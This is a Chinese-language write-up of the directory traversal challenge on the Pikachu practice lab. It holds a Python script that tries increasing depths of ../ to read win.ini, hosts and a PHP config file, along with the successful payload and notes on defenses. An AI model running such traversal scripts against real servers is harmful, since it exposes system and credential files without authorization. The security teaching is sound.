【Pikachu】Web-目录遍历(Directory Traversal) Writeup

操作者：何芊宏 | 操作日期：2026.9.29 | 分类：Pikachu | 标签：Pikachu, Web, 目录遍历, 路径穿越, Python自动化

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - 目录遍历 (Directory Traversal)
  • 题目名称：目录遍历
  • 目标：利用后端未过滤路径穿越符 ../ 的缺陷，跳出 Web 目录限制，读取服务器上的系统敏感文件（如 Windows 的 win.ini）。

2. 解题思路与知识点

漏洞原理：

目录遍历漏洞产生的原因是，Web 应用在读取文件时，允许用户控制文件路径（如通过 URL 的 title 参数）。如果后端未对 ../ 进行过滤，攻击者就可以利用它跳出 Web 根目录，访问并读取服务器本地的任意文件。

手工测试与自动化测试的区别：
  • 手工测试：通过浏览器地址栏修改参数，尝试不同层级的 ../。效率低，且难以判断需要穿越多少层才能到达系统根目录。
  • 自动化测试：编写 Python 脚本，利用 requests 库批量发送请求，根据响应特征自动判断路径深度和漏洞是否利用成功。

3. 操作步骤

第一步：识别参数

操作： 在页面上右键点击任意一行文本（如 Truman's word!），选择“复制链接地址”。

URL 结构： http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=truman.php。

分析： 后端通过 GET 请求接收 title 参数，并将其值（truman.php）作为文件路径进行读取。该参数完全由客户端可控。

第二步：编写 Python 脚本进行自动化测试

操作： 在 VS Code 中创建脚本 dir_traversal.py，批量尝试不同层级的路径穿越。

import requests

target_url = "http://127.0.0.1/pikachu/vul/dir/dir_list.php"
param_name = "title"

target_files = [
    "Windows/win.ini",
    "Windows/System32/drivers/etc/hosts",
    "index.php",
    "inc/config.inc.php"
]

print("[*] 开始目录遍历自动化测试...")
print("-" * 50)

for depth in range(1, 11):
    prefix = "../" * depth
    
    for target_file in target_files:
        payload = prefix + target_file
        params = {param_name: payload}
        
        try:
            r = requests.get(target_url, params=params, timeout=5)
            
            if r.status_code == 200:
                if "for 16-bit app support" in r.text:
                    print(f"[+] 成功读取系统文件！层级: {depth} | Payload: {payload}")
                    print(f"    响应片段: {r.text[:100]}...")
                    break
                elif "<?php" in r.text and "failed to open stream" not in r.text:
                    print(f"[+] 成功读取源码文件！层级: {depth} | Payload: {payload}")
                    print(f"    响应片段: {r.text[:100]}...")
                    break
        except Exception as e:
            print(f"[!] 请求发生异常: {e}")
            
print("-" * 50)
print("[*] 测试完成。")

代码组成详细解释：

  • target_url：目标靶场接口的完整地址。
  • param_name = "title"：URL 中的参数名，根据浏览器地址栏确认。
  • target_files：包含 Windows 系统文件和 Web 源码文件的列表。
  • for depth in range(1, 11)：循环尝试 1 到 10 层路径穿越。
  • prefix = "../" * depth：根据当前循环层级生成对应数量的 ../ 字符串。
  • params = {param_name: payload}：使用 requests 库自动拼接 URL 参数。
  • if "for 16-bit app support" in r.text：特征匹配。如果页面响应包含 win.ini 的开头，判定为成功读取系统文件。

第三步：脚本运行结果与漏洞验证

终端输出：

[+] 成功读取系统文件！层级: 10 | Payload: ../../../../../../../../../../Windows/win.ini
    响应片段: <!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="X-UA-Compatible" content="IE=edge,chro...
--------------------------------------------------
[*] 测试完成。

回显分析： 脚本在遍历到第 10 层 ../ 时，触发了 win.ini 特征匹配，证明成功读取了该系统文件。响应片段开头是 HTML 标签，是因为后端 include() 或读取函数保留了当前页面的 HTML 骨架，但不影响漏洞成立的判定。

成功 Payload： ../../../../../../../../../../Windows/win.ini

代码组成解释：

  • ../：目录穿越符，表示上一级目录。连续使用 10 个，用于跳出深层的 Web 目录，到达系统盘根目录。
  • Windows/win.ini：目标系统文件。该文件是 Windows 的核心配置文件，常用于验证目录遍历漏洞是否利用成功。

4. 踩坑记录与复盘

  • 坑1：手工测试效率低下。在浏览器地址栏手动输入不同数量的 ../ 时，不仅繁琐，而且无法准确判断需要穿越多少层才能到达系统根目录。
    解决办法： 放弃手工测试，编写 Python 脚本批量尝试 1 到 10 层路径穿越，通过特征匹配（for 16-bit app support）自动定位正确的层级和 Payload。
  • 坑2：响应片段开头包含 HTML 标签的误判。脚本输出结果显示响应片段开头为 <!DOCTYPE html>，容易让人误以为没有读到系统文件。
    原因排查： 后端在读取文件内容时，保留了当前页面原有的 HTML 结构，将 win.ini 的内容嵌入在了 HTML 源码的某处。通过特征匹配（搜索 win.ini 的独特内容）可以准确判断漏洞是否成功，而不应仅依赖响应开头的字符串。

5. 知识总结

  • 漏洞本质：目录遍历的本质是“输入未过滤”。后端过度信任客户端提交的文件路径，导致攻击者能够利用 ../ 跳出预期的目录限制。
  • 防御措施：禁止在文件路径参数中使用 ../ 或绝对路径；使用白名单机制，只允许包含特定的文件名或扩展名；使用 basename() 函数剥离路径信息。
  • 实战启发：遇到文件读取、下载等功能时，应优先测试目录遍历。对于路径层级未知的情况，使用 Python 自动化脚本遍历深度是一种高效且准确的方法。
